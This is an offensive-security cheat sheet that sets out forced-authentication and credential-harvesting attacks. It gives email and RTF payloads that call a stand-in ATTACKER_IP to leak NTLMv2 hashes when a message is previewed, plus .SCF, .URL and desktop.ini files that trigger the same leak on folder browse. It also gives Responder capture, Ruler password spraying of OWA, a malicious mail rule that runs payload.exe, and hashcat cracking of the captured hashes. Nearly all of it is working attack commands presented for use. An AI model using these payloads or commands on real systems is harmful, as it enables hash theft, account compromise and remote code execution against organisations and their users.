# Credential Harvesting & Forced Authentication

## NetNTLMv2 Stealing via Outlook
- Craft HTML email with: `<img src="file://ATTACKER_IP/image.jpg">`
- Or RTF: `{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://ATTACKER_IP/test.jpg"}}}}`
- Insert as text in Outlook; victim previewing email leaks NTLMv2 hash
- Capture with: `responder -I eth1 -v`

## Forced Authentication (T1187)
- **Via .SCF**: Drop in shared folder, auto-executes on folder browse
  `[Shell]` / `Command=2` / `IconFile=\\ATTACKER_IP\icon.ico`
- **Via .URL**: `IconFile=\\ATTACKER_IP\%USERNAME%.icon`
- **Via Word hyperlink**: Link pointing to `\\ATTACKER_IP\share`
- **Via desktop.ini**: Place in writable share

## OWA Password Spraying
```bash
# Spray with Ruler
ruler -k --domain target.com brute --users users.txt --passwords passwords.txt --verbose
# On success, create malicious mail rule for RCE
ruler -k --email user@target.com -u user -p pass display
ruler -k --email user@target.com -u user -p pass add --trigger "keyword" --location "\\path\payload.exe"
```

## Hash Cracking
```bash
# Crack NetNTLMv2 with hashcat
hashcat -m5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
